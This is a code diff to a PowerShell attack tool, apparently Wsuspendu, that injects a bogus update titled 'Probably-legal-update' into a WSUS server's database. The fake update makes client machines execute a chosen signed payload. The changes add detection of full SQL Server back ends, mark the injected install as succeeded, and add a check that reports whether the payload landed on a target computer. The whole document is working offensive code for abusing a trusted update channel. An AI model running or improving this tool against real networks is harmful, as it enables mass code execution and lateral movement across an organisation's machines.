@@ -8,12 +8,10 @@
       Set-ExecutionPolicy -ExecutionPolicy unrestricted (or bypass)
 
 .NOTES
-   Authors: Yves Le Provost (yves.le-provost@ssi.gouv.fr) & Romain Coltel (romain.coltel@alsid.eu)
+   Authors: Yves Le Provost (yves.le-provost@ssi.gouv.fr) & Romain Coltel (romain.coltel@alsid.com)
 
    TODO:
-   * Real-SQLServer connexion
    * Remote PowerShell: upload the PayloadFile
-   * --check option (cf spGetUpdateInstallationInfoFor*)
 
 .PARAMETER PayloadFile
     File to be executed on the target. It MUST be signed (using Authenticode) by Microsoft or a trusted third-party.
@@ -54,6 +52,7 @@ Param(
    [switch] $Clean,
 
    [Parameter (Mandatory = $True, ParameterSetName = 'cleancase')]
+   [Parameter (Mandatory = $True, ParameterSetName = 'checkcase')]
    [string] $UpdateID,
 
    [Parameter (Mandatory = $True, ParameterSetName = 'addcase', Position = 0)]
@@ -74,22 +73,29 @@ function Connection
    $Version = (Get-WmiObject Win32_OperatingSystem).Version
    Write-Debug "OS Version : $Version"
 
-   # TODO Check this key to get the mean to contact the WSUS server:
-   #   HKLM\Software\Microsoft\Update Services\Server\Setup: SqlServerName
    # Note: for a value of 'MICROSOFT##WID', we contact the server with 'np:\\.\pipe\MICROSOFT##WID\tsql\query'
 
-   # TODO Don't use a hardcoded value for the SUSDB database, see this registry value:
-   #   HKLM\Software\Microsoft\Update Services\Server\Setup: SqlDatabaseName
+   $SqlServerName = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Update Services\Server\setup').SqlServerName
+   $SqlDatabaseName = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Update Services\Server\setup').SqlDatabaseName
 
-   if ($Version -lt 6.2.0)
+   if ( ($SqlServerName -eq 'MICROSOFT##WID') -or ($SqlServerName -eq 'MSSQL$MICROSOFT##SSEE') )
    {
-      # Win2008
-      $Conn.ConnectionString = 'Server=np:\\.\pipe\MSSQL$MICROSOFT##SSEE\sql\query;Database=SUSDB;Integrated Security=True'
+
+      if ($Version -lt 6.2.0)
+      {
+         # WID Win2008
+         $Conn.ConnectionString = 'Server=np:\\.\pipe\MSSQL$MICROSOFT##SSEE\sql\query;Database='+$SqlDatabaseName+';Integrated Security=True'
+      }
+      else
+      {
+         # WID Win2012 and >
+         $Conn.ConnectionString = 'Server=np:\\.\pipe\MICROSOFT##WID\tsql\query;Database='+$SqlDatabaseName+';Integrated Security=True'
+      }
    }
    else
    {
-      #win2012 and >
-      $Conn.ConnectionString = 'Server=np:\\.\pipe\MICROSOFT##WID\tsql\query;Database=SUSDB;Integrated Security=True'
+      # SQL Server
+      $Conn.ConnectionString = 'Server=' + $SqlServerName + ';Database='+$SqlDatabaseName+';Trusted_Connection=True'
    }
 
    try
@@ -310,7 +316,7 @@ exec spImportUpdate @UpdateXml=N''
       </upd:File>
    </upd:Files>
    <upd:HandlerSpecificData xsi:type="cmd:CommandLineInstallation" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:pub="http://schemas.microsoft.com/msus/2002/12/Publishing">
-      <cmd:InstallCommand Arguments="' + $OFile.Args + '" Program="' + $OFile.Name + '" RebootByDefault="false" DefaultResult="Failed" xmlns:cmd="http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/CommandLineInstallation">
+      <cmd:InstallCommand Arguments="' + $OFile.Args + '" Program="' + $OFile.Name + '" RebootByDefault="false" DefaultResult="Succeeded" xmlns:cmd="http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/CommandLineInstallation">
          <cmd:ReturnCode Reboot="false" Result="Succeeded" Code="0" />
       </cmd:InstallCommand>
    </upd:HandlerSpecificData>
@@ -343,7 +349,7 @@ exec spSaveXmlFragment
 '" + $UpdateGuid + "',202,4,N'&lt;LocalizedProperties&gt;&lt;Language&gt;en&lt;/Language&gt;&lt;Title&gt;Probably-legal-update&lt;/Title&gt;&lt;/LocalizedProperties&gt;',NULL,'en'
 
 exec spSaveXmlFragment
-'" + $UpdateGuid + "',202,2,N'&lt;ExtendedProperties DefaultPropertiesLanguage=""en"" Handler=""http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/CommandLineInstallation"" MaxDownloadSize=""" + $OFile.Size + """ MinDownloadSize=""" + $OFile.Size + """&gt;&lt;InstallationBehavior RebootBehavior=""NeverReboots"" /&gt;&lt;/ExtendedProperties&gt;&lt;Files&gt;&lt;File Digest=""" + $OFile.Digest.SHA1 + """ DigestAlgorithm=""SHA1"" FileName=""" + $OFile.Name + """ Size=""" + $OFile.Size + """ Modified=""2010-11-25T15:26:20.723""&gt;&lt;AdditionalDigest Algorithm=""SHA256""&gt;" + $OFile.Digest.SHA256 + "&lt;/AdditionalDigest&gt;&lt;/File&gt;&lt;/Files&gt;&lt;HandlerSpecificData type=""cmd:CommandLineInstallation""&gt;&lt;InstallCommand Arguments=""" + $OFile.Args + """ Program=""" + $OFile.Name + """ RebootByDefault=""false"" DefaultResult=""Failed""&gt;&lt;ReturnCode Reboot=""false"" Result=""Succeeded"" Code=""0"" /&gt;&lt;/InstallCommand&gt;&lt;/HandlerSpecificData&gt;',NULL
+'" + $UpdateGuid + "',202,2,N'&lt;ExtendedProperties DefaultPropertiesLanguage=""en"" Handler=""http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/CommandLineInstallation"" MaxDownloadSize=""" + $OFile.Size + """ MinDownloadSize=""" + $OFile.Size + """&gt;&lt;InstallationBehavior RebootBehavior=""NeverReboots"" /&gt;&lt;/ExtendedProperties&gt;&lt;Files&gt;&lt;File Digest=""" + $OFile.Digest.SHA1 + """ DigestAlgorithm=""SHA1"" FileName=""" + $OFile.Name + """ Size=""" + $OFile.Size + """ Modified=""2010-11-25T15:26:20.723""&gt;&lt;AdditionalDigest Algorithm=""SHA256""&gt;" + $OFile.Digest.SHA256 + "&lt;/AdditionalDigest&gt;&lt;/File&gt;&lt;/Files&gt;&lt;HandlerSpecificData type=""cmd:CommandLineInstallation""&gt;&lt;InstallCommand Arguments=""" + $OFile.Args + """ Program=""" + $OFile.Name + """ RebootByDefault=""false"" DefaultResult=""Succeeded""&gt;&lt;ReturnCode Reboot=""false"" Result=""Succeeded"" Code=""-1"" /&gt;&lt;/InstallCommand&gt;&lt;/HandlerSpecificData&gt;',NULL
     "
 
    try
@@ -696,6 +702,17 @@ if ($Inject)
    Write-Output "Everything seems ok. Wait for the client to take the update now..."
    Write-Output "To clean the injection, execute the following command:"
    Write-Output ".\Wsuspendu.ps1 -Clean -UpdateID $($Guid.Bundle)"
+   if ($ComputerName -ne 'OnDownstreamServer')
+   {
+      Write-Output "To check the update status, execute the following command:"
+      Write-Output ".\Wsuspendu.ps1 -check -UpdateID $($Guid.Bundle) -ComputerName $($ComputerName)"
+   }
+   else
+   {
+      Write-Output "To check the update status for a specific computer, execute the following command:"
+      Write-Output ".\Wsuspendu.ps1 -check -UpdateID $($Guid.Bundle) -ComputerName [Computer name]"
+   }
+   Write-Host -ForegroundColor Green "Done"
 }
 
 if ($Add)
@@ -704,11 +721,12 @@ if ($Add)
    if (-not $TargetGroupID)
    {
       Write-Error "You can't add a computer if the injection group '$GroupName' doesn't exist"
-      exit 4
+      Exit 4
    }
 
    $ComputerID = GetComputerTarget -ComputerName $ComputerName
    AddComputerToGroup -GroupID $TargetGroupID -ComputerTargetID $ComputerID
+   Write-Host -ForegroundColor Green "Done"
 }
 
 if ($Remove)
@@ -722,6 +740,7 @@ if ($Remove)
 
    $ComputerID = GetComputerTarget -ComputerName $ComputerName
    RemoveComputerFromGroup -GroupID $TargetGroupID -ComputerTargetID $ComputerID
+   Write-Host -ForegroundColor Green "Done"
 }
 
 if ($Clean)
@@ -746,11 +765,65 @@ if ($Clean)
    DeleteUpdate -UpdateID $UpdateID
    $Dir = GetUpdateDirectory
    RemoveFile -Directory $Dir
+   Write-Host -ForegroundColor Green "Done"
 }
 
 if($Check)
 {
-   # TODO
+   $TargetID = GetComputerTarget -ComputerName $ComputerName
+
+
+   $g_SQLCmd.CommandText = "SELECT LocalUpdateID FROM dbo.tbUpdate WHERE UpdateID = '$UpdateID'"
+   try
+   {
+      $Reader = $g_SQLCmd.ExecuteReader()
+   }
+   catch [System.Data.SqlClient.SqlException]
+   {
+      Write-Error "$_"
+      Exit 2
+   }
+
+   if ($Reader.Read())
+   {
+      $LocalUpdateID = $Reader.GetValue($Reader.GetOrdinal('LocalUpdateID'))
+   }
+   else
+   {
+      Write-Error "UpdateID $UpdateID cannot be found"
+      Exit 4
+   }
+   $Reader.Close()
+
+   $g_SQLCmd.CommandText = "SELECT SummarizationState FROM dbo.tbUpdateStatusPerComputer WHERE LocalUpdateID=$LocalUpdateID AND TargetID=$TargetID"
+   try
+   {
+      $Reader = $g_SQLCmd.ExecuteReader()
+   }
+   catch [System.Data.SqlClient.SqlException]
+   {
+      Write-Error "$_"
+      Exit 2
+   }
+
+   if ($Reader.Read())
+   {
+      $SummarizationState = $Reader.GetValue($Reader.GetOrdinal('SummarizationState'))
+      switch ($SummarizationState)
+      {
+         2 { Write-Host '> Update is not installed'; break }
+         3 { Write-Host '> Update is downloaded'; break }
+         4 { Write-Host '> Update is installed'; break }
+         5 { Write-Host '> Update failed'; break }
+         default { Write-Host "x Unknown state: $SummarizationState" }
+      }
+   }
+   else
+   {
+      Write-Host -ForegroundColor Red "Update Info cannot be found"
+      Exit 4
+   }
+   $Reader.Close()
 }
 
 $g_SQLCmd.Connection.Close()
